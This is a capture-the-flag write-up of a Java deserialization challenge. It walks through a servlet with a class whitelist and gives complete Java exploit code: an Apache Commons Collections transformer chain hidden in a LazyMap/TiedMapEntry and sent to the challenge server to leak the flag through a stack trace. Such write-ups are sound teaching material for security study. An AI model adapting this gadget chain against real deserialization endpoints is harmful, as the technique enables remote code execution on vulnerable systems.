# Java pwn (misc, 300p)

This was a pretty straightforward task, since we've done similar exploits already here:

https://github.com/p4-team/ctf/tree/master/2016-08-21-bioterra-ctf/akashic_records
https://github.com/p4-team/ctf/tree/master/2018-01-20-insomnihack/pwn_magic_hat

In the task we get a [Java Web Archive](blueprint.war) and IP where this app is running.
We can just add this archive as library to a project in IntelliJ and it will decompile the code for us.
Once we do that it becomes quite obvious what is the purpose here.

We've got a web servlet:

```java
@WebServlet({"/jail"})
public class Server extends HttpServlet {
    private static final long serialVersionUID = 1L;

    public Server() {
    }

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            ServletInputStream is = request.getInputStream();
            ObjectInputStream ois = new CustomOIS(is);
            Person person = (Person)ois.readObject();
            ois.close();
            response.getWriter().append("Sorry " + person.name + ". I cannot let you have the Flag!.");
        } catch (Exception var6) {
            response.setStatus(500);
            var6.printStackTrace(response.getWriter());
        }

    }
}
```

So it basically reads objects from the POST payload and deserialize them with custom deserializer.
Interestingly it also sends back the stacktrace if something goes wrong.
The deserializer is:

```java
public class CustomOIS extends ObjectInputStream {
    private static final String[] whitelist = new String[]{"javax.management.BadAttributeValueExpException", "java.lang.Exception", "java.lang.Throwable", "[Ljava.lang.StackTraceElement;", "java.lang.StackTraceElement", "java.util.Collections$UnmodifiableList", "java.util.Collections$UnmodifiableCollection", "java.util.ArrayList", "org.apache.commons.collections.keyvalue.TiedMapEntry", "org.apache.commons.collections.map.LazyMap", "org.apache.commons.collections.functors.ChainedTransformer", "[Lorg.apache.commons.collections.Transformer;", "org.apache.commons.collections.functors.ConstantTransformer", "com.trendmicro.jail.Flag", "org.apache.commons.collections.functors.InvokerTransformer", "[Ljava.lang.Object;", "[Ljava.lang.Class;", "java.lang.String", "java.lang.Object", "java.lang.Integer", "java.lang.Number", "java.util.HashMap", "com.trendmicro.Person"};

    public CustomOIS(ServletInputStream is) throws IOException {
        super(is);
    }

    public Class<?> resolveClass(ObjectStreamClass des) throws IOException, ClassNotFoundException {
        if (!Arrays.asList(whitelist).contains(des.getName())) {
            throw new ClassNotFoundException("Cannot deserialize " + des.getName());
        } else {
            return super.resolveClass(des);
        }
    }
}
```

It's nice that organizers showed exacly which classes we can use, especially including stuff like `ConstantTransformer`, `InvokerTransformer` and `Flag`.

If we check the `Flag` class it's actually:

```java
public class Flag implements Serializable {
    static final long serialVersionUID = 6119813099625710381L;

    public Flag() {
    }

    public static void getFlag() throws Exception {
        throw new Exception("<FLAG GOES HERE>");
    }
}
```

So we basically need to deserialize the Flag object and then call `getFlag` method, and the server should send back the stacktrace with the flag.

The idea is to use transformers chain, which invokes `getFlag` method on `Flag` object when performing transformation, and use this chain in a TiedMapEntry of a LazyMap.
We place this entry in a map and send this map to the server.
Once the server deserializes the payload it will have to resolve the map entry, and thus call the transformers, firing the payload.

Our exploit payload is:

```java
    private static Object preparePayload() {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Flag.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getFlag", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new ConstantTransformer(1)};
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("foo", "foo");
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        Object[] nodesArray = Whitebox.getInternalState(innerMap, "table");
        Object node = Arrays.stream(nodesArray)
                .filter(Objects::nonNull)
                .findFirst()
                .orElseThrow(() -> new RuntimeException("this can't happen"));
        Whitebox.setInternalState(node, "key", entry);
        return innerMap;
    }
```

Keep in mind we don't want the map to "resolve" the lazy tied map entry on our side, so we don't insert the entry directly to the map using map methods.
Instead we use reflection to directly access the array backing the map.

We send this payload via:

```java
    public static void main(String[] args) throws IOException {
        RestTemplate restTemplate = new RestTemplate();
        Object payload = preparePayload();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            ObjectOutput out = new ObjectOutputStream(bos);
            out.writeObject(payload);
            out.flush();
            byte[] yourBytes = bos.toByteArray();
            HttpEntity<byte[]> entity = new HttpEntity<>(yourBytes);
            ResponseEntity<String> response = restTemplate.postForEntity("http://theflagmarshal.us-east-1.elasticbeanstalk.com/jail", entity, String.class);
            System.out.println(response);
            System.out.println(response.getStatusCode());
            System.out.println(response.getBody());
        } catch (HttpServerErrorException ex) {
            System.out.println(ex.getResponseBodyAsString());
        } finally {
            try {
                bos.close();
            } catch (IOException ex) {
                // ignore close exception
            }
        }
    }
```

And we get back the flag: `TMCTF{15nuck9astTheF1agMarsha12day}`
